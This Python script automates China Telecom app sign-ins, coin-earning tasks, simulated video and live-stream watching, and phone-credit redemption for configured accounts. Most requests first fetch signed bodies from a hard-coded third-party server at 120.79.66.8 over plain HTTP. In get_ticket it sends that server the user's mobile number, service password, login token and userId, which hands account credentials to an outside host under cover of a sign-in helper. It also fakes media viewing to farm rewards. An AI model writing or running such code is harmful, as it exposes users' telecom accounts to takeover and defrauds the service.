# -*- coding: utf-8 -*-
import re
import time
import base64
import requests
import threading
import urllib.parse
import xml.dom.minidom as xmldom

from notify import send


#--------------以下为配置区需自行填写--------------#

# 参数说明
# mobile    手机号
# password  服务密码 (为空时不执行需登录才能完成的任务)
# food      喂食开关 (开启填 True, 关闭填 False)
config_list = [
    {"mobile": "12345678911", "password": "1234", "food": False},
    #{"mobile": "12345678911", "password": "", "food": False},
]

#--------------配置区结束------------#
app_headers = {"User-Agent": "Xiaomi MI 9/9.2.0"}
msg_list = []
host = 'http://120.79.66.8:6987'


def telecom_task(config):
    msg = []
    mobile = config['mobile']
    password = config['password']
    msg.append(mobile + " 开始执行任务...")
    print(mobile + " 开始执行任务...")
    h5_headers = get_h5_headers(mobile)
    # 获取用户中心
    home_info_body = requests.get(url="{}/telecom/getHomeInfoSign".format(host), params={"mobile": mobile}).json()
    home_info_ret = requests.post(url="https://wapside.189.cn:9001/jt-sign/api/home/homeInfo", json=home_info_body, headers=h5_headers).json()
    if home_info_ret['resoultMsg'] != "成功":
        msg.append(home_info_ret['resoultMsg'])
        print(home_info_ret['resoultMsg'])
        return
    old_coin = home_info_ret['data']['userInfo']['totalCoin']

    # 签到
    sign_body = requests.get(url="{}/telecom/getSign".format(host), params={"mobile": mobile}).json()
    sign_ret = requests.post(url="https://wapside.189.cn:9001/jt-sign/api/home/sign", json=sign_body,
                             headers=h5_headers).json()
    if sign_ret['data']['code'] == 1:
        msg.append("签到成功, 本次签到获得 " + str(sign_ret['data']['coin']) + " 豆")
        print("签到成功, 本次签到获得 " + str(sign_ret['data']['coin']) + " 豆")
    else:
        msg.append(sign_ret['data']['msg'])
        print(sign_ret['data']['msg'])

    # 登录任务
    if password != '':
        ticket = get_ticket(mobile, password, msg)
        if ticket != '':
            xbk_live(ticket, mobile, msg)
            xbk_video(ticket, mobile, msg)
            share_to_get_coin(ticket, mobile, msg)

    # 获取所有任务
    task_info_body = requests.get(url="{}/telecom/getPhoneSign".format(host), params={"mobile": mobile}).json()
    task_ret = requests.post(url="https://wapside.189.cn:9001/jt-sign/paradise/getTask", headers=h5_headers,
                             json=task_info_body).json()
    if task_ret['resoultCode'] == '0':
        tasks = task_ret['data']
        for task in tasks:
            task_id = task['taskId']
            task_name = task['title']
            task_body = requests.get(url="{}/telecom/getTaskSign2".format(host),
                                     params={"mobile": mobile, "task": task_id}).json()
            polymerize_ret = requests.post(url="https://wapside.189.cn:9001/jt-sign/paradise/polymerize",
                                           json=task_body, headers=h5_headers).json()
            if polymerize_ret['resoultCode'] == 0:
                log_msg = task_name + polymerize_ret['data']['err']
                print(log_msg)
                msg.append(log_msg)
            time.sleep(3)
    # 获取用户中心
    home_info_ret = requests.post(url="https://wapside.189.cn:9001/jt-sign/api/home/homeInfo", json=home_info_body,
                                  headers=h5_headers).json()
    new_coin = home_info_ret['data']['userInfo']['totalCoin']
    msg.append("领取完毕, 现有金豆: " + str(new_coin))
    print("领取完毕, 现有金豆: " + str(new_coin))
    msg.append("本次领取金豆: " + str(new_coin - old_coin))
    print("本次领取金豆: " + str(new_coin - old_coin))

    # 喂食
    food(config, msg)

    # 签到7天领取话费
    convert_reward(config, msg)
    msg.append("----------------------------------------------")
    msg_list.extend(msg)


def food(config, msg):
    if config['food']:
        mobile = config['mobile']
        msg.append(mobile + " 开始执行喂食...")
        print(mobile + " 开始执行喂食...")
        while True:
            food_body = requests.get(url="{}/telecom/getPhoneSign".format(host), params={"mobile": mobile}).json()
            food_ret = requests.post(url="https://wapside.189.cn:9001/jt-sign/paradise/food", json=food_body,
                                     headers=get_h5_headers(mobile)).json()
            msg.append(food_ret['resoultMsg'])
            print(food_ret['resoultMsg'])
            if food_ret['resoultCode'] != '0':
                break


def convert_reward(config, msg):
    mobile = config['mobile']
    msg.append(mobile + " 开始执行满7天兑换话费...")
    print(mobile + " 开始执行满7天兑换话费...")
    phone_body = requests.get(url="{}/telecom/getPhoneSign".format(host), params={"mobile": mobile}).json()
    activity_ret = requests.post(url="https://wapside.189.cn:9001/jt-sign/reward/activityMsg", json=phone_body,
                                 headers=get_h5_headers(mobile)).json()
    msg.append("你已连续签到 " + str(activity_ret['totalDay']) + " 天")
    print("你已连续签到 " + str(activity_ret['totalDay']) + " 天")
    if activity_ret['recordNum'] > 0:
        #可以领取
        reward_id = activity_ret['date']['id']
        params = {
            "mobile": mobile,
            "rewardId": reward_id
        }
        reward_body = requests.get(url="{}/telecom/getConvertReward".format(host), params=params).json()
        reward_ret = requests.post(url="https://wapside.189.cn:9001/jt-sign/reward/convertReward", json=reward_body,
                                   headers=get_h5_headers(mobile)).json()
        if reward_ret['code'] == '0':
            msg.append(reward_ret['msg'])
            print(reward_ret['msg'])


def get_h5_headers(mobile):
    base64_mobile = str(base64.b64encode(mobile[5:11].encode('utf-8')), 'utf-8').strip(r'=+') + "!#!" + str(
        base64.b64encode(mobile[0:5].encode('utf-8')), 'utf-8').strip(r'=+')
    return {"User-Agent": "CtClient;9.2.0;Android;10;MI 9;" + base64_mobile}


def format_msg():
    str1 = ''
    for item in msg_list:
        str1 += str(item) + "\r\n"
    return str1


def get_ticket(mobile, password, msg):
    login_body = requests.get(url="{}/telecom/getUserLoginNormal".format(host),
                              params={"mobile": mobile, "password": password}).json()
    login_ret = requests.post(url="https://appgologin.189.cn:9031/login/client/userLoginNormal",
                              json=login_body,
                              headers=app_headers).json()
    if login_ret['responseData']['resultCode'] != '0000':
        msg.append("登录失败, " + login_ret['responseData']['resultDesc'])
        print("登录失败, " + login_ret['responseData']['resultDesc'])
        return ''
    msg.append('登录成功')
    print('登录成功')
    token = login_ret['responseData']['data']['loginSuccessResult']['token']
    user_id = login_ret['responseData']['data']['loginSuccessResult']['userId']

    ticket_body = requests.get(url="{}/telecom/getTicket".format(host),
                               params={"mobile": mobile, "token": token, "userId": user_id}).text
    ticket_ret = requests.post(url="https://appgo.189.cn:9031/map/clientXML",
                               data=ticket_body,
                               headers={"Content-Type":"text/xml", **app_headers}).text
    collection = xmldom.parseString(ticket_ret).documentElement
    ticket = collection.getElementsByTagName("Ticket")[0].childNodes[0].data
    return requests.get(url="{}/telecom/decryptTicket".format(host), params={"ticket": ticket}).text


def xbk_video(ticket, mobile, msg):
    msg.append(mobile + " 开始执行星播客视频任务...")
    print(mobile + " 开始执行星播客视频任务...")
    h5_headers = get_h5_headers(mobile)
    res = requests.get(url="https://xbk.189.cn/xbkapi/api/auth/jump?userID="+ticket+"&version=$version$&type=newHome&tab=1&l=renwu",allow_redirects=False)
    location = urllib.parse.unquote(res.headers['location'])
    usercode = re.search(r'usercode=(.+?)&', location).group(1)
    token_ret = requests.post(url="https://xbk.189.cn/xbkapi/api/auth/userinfo/codeToken", json={"usercode": usercode}, headers=h5_headers).json()
    token = token_ret['data']['token']
    xbk_headers={"authorization": "Bearer " + token, **h5_headers}
    # 获取视频列表
    video_ret = requests.get(url="https://xbk.189.cn/xbkapi/lteration/index/recommend/floorRecommend?provinceCode=18&p=1", headers=xbk_headers).json()
    article_id = video_ret['data'][0]['id']
    # 播放
    requests.post(url="https://xbk.189.cn/xbkapi/lteration/liveTask/index/watchVideo", json={"articleId": article_id}, headers=xbk_headers)
    # 领取豆
    while True:
        ret = requests.post(url="https://xbk.189.cn/xbkapi/lteration/liveTask/index/watchVideo", json={"articleId": article_id}, headers=xbk_headers).json()
        if ret['code'] == 0:
            msg.append("成功领取 5 豆")
            print("成功领取 5 豆")
        else:
            msg.append(ret['msg'])
            print(ret['msg'])
            break
        # 等待15s
        time.sleep(16)


def xbk_live(ticket, mobile, msg):
    msg.append(mobile + " 开始执行星播客直播任务...")
    print(mobile + " 开始执行星播客直播任务...")
    h5_headers = get_h5_headers(mobile)
    res = requests.get(url="https://xbk.189.cn/xbkapi/api/auth/jump?userID="+ticket+"&version=$version$&type=room&tab=1&l=renwu",allow_redirects=False)
    location = urllib.parse.unquote(res.headers['location'])
    usercode = re.search(r'usercode=(.+?)&', location).group(1)
    live_id = re.search(r'liveId=(.+?)&', location).group(1)
    period = re.search(r'period=(.+?)&', location).group(1)

    token_ret = requests.post(url="https://xbk.189.cn/xbkapi/api/auth/userinfo/codeToken", json={"usercode": usercode}, headers=h5_headers).json()
    token = token_ret['data']['token']
    xbk_headers={"authorization": "Bearer " + token, **h5_headers}

    data = {"liveId": live_id, "period": period}
    # 领取豆
    while True:
        init_ret = requests.post(url="https://xbk.189.cn/xbkapi/lteration/liveTask/index/watchLiveInit", json=data, headers=xbk_headers).json()
        key = init_ret['data']
        #等待15秒
        time.sleep(16)
        watch_ret = requests.post(url="https://xbk.189.cn/xbkapi/lteration/liveTask/index/watchLive", json={**data, "key": key}, headers=xbk_headers).json()
        if watch_ret['code'] == 0:
            msg.append("成功领取 5 豆")
            print("成功领取 5 豆")
        else:
            msg.append(watch_ret['msg'])
            print(watch_ret['msg'])
            break


def share_to_get_coin(ticket, mobile, msg):
    msg.append(mobile + " 开始执行分享得豆任务...")
    print(mobile + " 开始执行分享得豆任务...")
    h5_headers = get_h5_headers(mobile)
    data = "mpId=goldcoin&ticket="+ticket+"&srcSysID=35000&sceneSources=3&version=9.2.0"
    login_ret = requests.post(url="https://dxhd.189.cn:7081/actcenter/v1/goldcoinuser/login.do", params=data, headers=h5_headers).json()
    session = login_ret['module']['session']
    data = "activityId=telecomrecommend01&session=" + session
    ret = requests.post(url="https://dxhd.189.cn:7081/actcenter/v1/goldcoinuser/shareToGetCoin.do", params=data, headers=h5_headers).json()
    if ret['success']:
        msg.append('获得 20 豆')
        print('获得 20 豆')
    else:
        msg.append('今日已分享')
        print('今日已分享')


def main_handler(event, context):
    l = []
    for config in config_list:
        p = threading.Thread(target=telecom_task, args=(config,))
        l.append(p)
        p.start()
    for i in l:
        i.join()
    content = format_msg()
    send('电信签到任务', content)
    print(content)
    return content


if __name__ == '__main__':
    main_handler("", "")
